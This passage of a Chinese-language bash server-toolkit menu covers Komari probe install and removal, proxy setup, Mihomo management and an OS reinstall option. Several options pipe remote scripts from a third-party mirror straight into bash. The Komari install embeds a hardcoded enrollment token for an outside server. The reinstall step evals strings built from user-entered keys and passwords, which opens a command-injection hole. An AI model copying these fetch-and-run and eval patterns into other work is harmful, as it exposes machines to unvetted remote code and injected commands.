                            bash <(curl -sL https://hub.20250225.ggff.net/komari-monitor/install.sh) \
                            -e http://www.xuanying.dpdns.org \
                            --auto-discovery CX9cJyXs312zYwDWC8BpRkFV
                        else
                            echo -e "检测到海外服务器\n"
                            bash <(curl -sL https://hub.20250225.ggff.net/komari-monitor/usr/install.sh) \
                            -e http://www.xuanying.dpdns.org \
                            --auto-discovery CX9cJyXs312zYwDWC8BpRkFV
                        fi
                        echo -e "\nKomari 探针安装完成\n"
                        ;;
                    2)
                        echo -e "\n正在彻底卸载 Komari 探针...\n"
                        if command -v systemctl >/dev/null 2>&1; then
                            systemctl stop komari.service 2>/dev/null
                            systemctl disable komari.service 2>/dev/null
                            systemctl stop komari-monitor.service 2>/dev/null
                            systemctl disable komari-monitor.service 2>/dev/null
                            systemctl mask komari.service 2>/dev/null
                            systemctl mask komari-monitor.service 2>/dev/null
                        fi
                        service komari stop 2>/dev/null
                        service komari-monitor stop 2>/dev/null
                        pkill -9 -f komari 2>/dev/null
                        pkill -9 -f komari-monitor 2>/dev/null
                        killall -9 komari 2>/dev/null
                        killall -9 komari-monitor 2>/dev/null
                        rm -f /etc/systemd/system/komari.service
                        rm -f /etc/systemd/system/komari-monitor.service
                        rm -f /usr/lib/systemd/system/komari.service
                        rm -f /usr/lib/systemd/system/komari-monitor.service
                        rm -f /lib/systemd/system/komari.service
                        rm -f /lib/systemd/system/komari-monitor.service
                        rm -rf /etc/systemd/system/komari.service.d
                        rm -rf /etc/systemd/system/komari-monitor.service.d
                        systemctl daemon-reload 2>/dev/null
                        systemctl reset-failed 2>/dev/null
                        rm -f /etc/init.d/komari
                        rm -f /etc/init.d/komari-monitor
                        sed -i '/komari/d' /etc/rc.local 2>/dev/null
                        crontab -l 2>/dev/null | grep -v komari | crontab - 2>/dev/null
                        rm -f /etc/cron.d/komari*
                        rm -f /etc/cron.daily/komari*
                        rm -f /etc/cron.hourly/komari*
                        if is_synology; then
                            synosystemctl stop komari.service 2>/dev/null
                            rm -f /usr/local/etc/rc.d/komari.sh
                            rm -f /usr/local/etc/rc.d/S99komari.sh
                            rm -rf /usr/syno/etc/packages/komari*
                            rm -rf /var/packages/komari*
                            synoservice --disable pkgctl-komari 2>/dev/null
                        fi
                        rm -rf /opt/komari /usr/local/komari /etc/komari /var/lib/komari /var/log/komari
                        rm -f /usr/bin/komari /usr/local/bin/komari /usr/bin/komari-monitor /usr/local/bin/komari-monitor
                        rm -f /run/komari.pid /var/run/komari.pid /tmp/komari* /run/komari*
                        sync
                        echo -e "\nKomari 探针已彻底卸载\n"
                        ;;
                    0)
                        break
                        ;;
                esac
                read -p "按回车继续..."
                clear
            done
            ;;

        9)
            echo -e "\n正在启动扶墙安装...\n"
            bash <(curl -fsSL https://hub.20250225.ggff.net/sing-box/install-sing-box.sh)
            ;;

        10)
            deploy_docker_network_service
            ;;

        11)
            while true; do
                clear
                echo "=================================="
                echo "      Mihomo 内核代理管理"
                echo "=================================="
                echo
                echo "1. 一键安装 AnyTLS"
                echo "2. 一键安装 VMESS WS"
                echo "3. 查看节点"
                echo "4. 修改端口"
                echo "5. 查看状态"
                echo "6. 查看日志"
                echo "7. 重启服务"
                echo "8. 删除协议"
                echo "9. 开启 BBR"
                echo "10. 升级/降级核心"
                echo "11. 卸载"
                echo "0. 返回主菜单"
                echo
                read -rp "请选择: " MIHOMO_CHOOSE

                case "${MIHOMO_CHOOSE}" in
                    1) install_anytls ;;
                    2) install_vmess_ws ;;
                    3) show_node ;;
                    4) change_port ;;
                    5) show_status ;;
                    6) show_logs ;;
                    7) restart_service ;;
                    8) delete_protocol ;;
                    9) enable_bbr ;;
                    10) upgrade_core ;;
                    11) uninstall_mihomo ;;
                    0) break ;;
                esac
                echo
                read -n 1 -s -r -p "按任意键继续..."
            done
            ;;

        12)
            echo
            if unsupported_dd_system; then
                echo -e "当前系统不支持 DD\n群晖/OpenWRT/Armbian 已拦截\n"
                continue
            fi
            echo -e "正在下载 DD 脚本...\n"
            curl -O https://hub.20250225.ggff.net/bin456789/reinstall/main/reinstall.sh
            chmod +x reinstall.sh
            echo -e "\n请选择登录方式:\n1. SSH 密钥\n2. Root 密码\n"
            read -p "请输入选项: " ddlogin

            SSH_OPTION=""
            PASSWORD_OPTION=""

            if [ "$ddlogin" = "1" ]; then
                echo -e "\n1. 使用默认密钥\n2. 自定义密钥\n"
                read -p "请输入选项: " keymenu
                if [ "$keymenu" = "1" ]; then
                    SSH_OPTION="--ssh-key \"$DEFAULT_KEY\""
                else
                    echo
                    read -p "请输入自定义 SSH 密钥: " CUSTOM_KEY
                    SSH_OPTION="--ssh-key \"$CUSTOM_KEY\""
                fi
            elif [ "$ddlogin" = "2" ]; then
                echo -e "\n1. 自定义 Root 密码\n2. 自动生成 Root 密码\n"
                read -p "请输入选项: " passmenu
                if [ "$passmenu" = "1" ]; then
                    echo
                    read -p "请输入 Root 密码: " ROOTPASS
                else
                    ROOTPASS=$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
                    echo -e "\n随机 Root 密码:\n$ROOTPASS\n"
                fi
                PASSWORD_OPTION="--password \"$ROOTPASS\""
            fi

            echo -e "\n请选择系统:\n1. Debian 11\n2. Debian 12\n3. Debian 13\n4. Ubuntu 20.04\n5. Ubuntu 22.04\n6. Ubuntu 24.04\n7. Alpine\n"
            read -p "请输入选项: " ddsys
            case $ddsys in
                1) CMD="bash reinstall.sh debian 11" ;;
                2) CMD="bash reinstall.sh debian 12" ;;
                3) CMD="bash reinstall.sh debian 13" ;;
                4) CMD="bash reinstall.sh ubuntu 20.04" ;;
                5) CMD="bash reinstall.sh ubuntu 22.04" ;;
                6) CMD="bash reinstall.sh ubuntu 24.04" ;;
                7) CMD="bash reinstall.sh alpine" ;;
                *) echo "无效选项"; continue ;;
            esac

            echo -e "\n即将开始 DD 系统...\n\n$CMD $SSH_OPTION $PASSWORD_OPTION\n"
            sleep 3
            eval "$CMD $SSH_OPTION $PASSWORD_OPTION"
            ;;

        0)
            echo -e "\n已退出 SSH一键小工具\n"
            exit 0
            ;;
    esac

    read -p "按回车继续..."
    clear

done
